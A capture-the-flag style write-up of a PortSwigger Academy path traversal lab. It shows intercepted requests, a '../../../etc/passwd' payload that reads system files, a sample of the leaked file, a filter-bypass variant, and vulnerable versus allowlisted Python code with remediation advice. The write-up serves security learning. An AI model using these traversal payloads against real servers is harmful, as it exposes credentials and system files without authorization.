# Path Traversal Vulnerability

## Overview
Path Traversal, also known as Directory Traversal, is a web security vulnerability that allows an attacker to access files and directories stored outside the web root directory. This occurs when user-controlled input is not properly sanitized before being used in file system operations.

Attackers exploit traversal sequences such as:

```text
../
```

to navigate through the server’s file system and access sensitive files.

---

# Lab Information

| Field | Details |
|---|---|
| Category | Server-Side Vulnerabilities |
| Topic | Path Traversal |
| Platform | PortSwigger Web Security Academy |
| Difficulty | Apprentice |
| Tools Used | Burp Suite Community Edition |
| Status | Completed |

---

# Objective

The objective of this lab was to exploit a path traversal vulnerability to retrieve sensitive files from the server.

---

# Vulnerability Explanation

The application loads image files dynamically using a filename parameter in the URL.

Example request:

```http
GET /image?filename=218.png HTTP/1.1
```

The server fails to properly validate or sanitize user input before accessing files from the filesystem.

By manipulating the filename parameter with traversal sequences, it becomes possible to access files outside the intended directory.

---

# Attack Surface Identification

## Entry Point

```http
GET /image?filename=
```

## User-Controlled Input

- `filename` parameter

## Potential Risk

Improper validation of file paths can allow:
- Arbitrary file read
- Disclosure of sensitive system files
- Exposure of credentials or configuration files
- Further privilege escalation opportunities

---

# Exploitation Methodology

## Step 1 — Intercept Request

The request was intercepted using Burp Suite Proxy.

Original request:

```http
GET /image?filename=16.jpg HTTP/1.1
Host: vulnerable-website.com
```

---

## Step 2 — Test for Traversal Sequences

Traversal payloads were inserted into the `filename` parameter.

Payload used:

```text
../../../etc/passwd
```

Modified request:

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: vulnerable-website.com
```

---

## Step 3 — Analyze Server Response

The server responded with the contents of the `/etc/passwd` file, confirming successful path traversal.

Example response snippet:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

---

# Payload Analysis

| Payload | Purpose |
|---|---|
| `../` | Move one directory up |
| `../../../etc/passwd` | Access Linux password file |
| `..\` | Windows traversal sequence |
| `....//` | Filter bypass technique |

---

# Impact

Successful exploitation of path traversal vulnerabilities may result in:

- Exposure of sensitive system files
- Leakage of application source code
- Disclosure of credentials
- Access to configuration files
- Information disclosure aiding further attacks

---

# Root Cause

The vulnerability exists because the application directly uses user-supplied input in filesystem operations without:

- Path normalization
- Input sanitization
- Access restrictions
- Allowlist validation

---

# Detection Techniques

## Manual Testing

- Modifying filename parameters
- Using traversal sequences
- Testing filter bypass payloads

## Burp Suite Modules Used

- Proxy
- Repeater

---

# Remediation

## Recommended Security Controls

### 1. Validate User Input

Only allow predefined filenames or IDs.

### 2. Implement Allowlisting

Restrict access to specific directories and file types.

### 3. Normalize Paths

Resolve paths before processing requests.

### 4. Avoid Direct File Access

Use indirect object references instead of raw file paths.

### 5. Restrict File Permissions

Ensure sensitive system files are inaccessible to the web application.

---

# Example Secure Implementation

## Vulnerable Code

```python
file = request.GET['filename']
open("/var/www/images/" + file)
```

## Secure Approach

```python
allowed_files = ["image1.jpg", "image2.jpg"]

if filename in allowed_files:
    open("/var/www/images/" + filename)
```

---

# Key Takeaways

- Never trust user-controlled file path input.
- Path traversal vulnerabilities often arise from insufficient input validation.
- Burp Suite Repeater is highly effective for manipulating file path parameters.
- Understanding filesystem structure improves exploitation efficiency.
- Proper allowlisting significantly reduces risk.

---

# References

- OWASP Path Traversal
- PortSwigger Web Security Academy
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory

---

# Skills Practiced

- HTTP Request Manipulation
- Web Application Testing
- Burp Suite Repeater Usage
- Vulnerability Validation
- Server-Side Security Analysis

---

# Conclusion

This lab demonstrated how improper handling of user-controlled file paths can lead to unauthorized access to sensitive server files. By exploiting traversal sequences in HTTP requests, arbitrary files outside the intended directory were successfully accessed, highlighting the importance of robust input validation and secure filesystem handling practices.
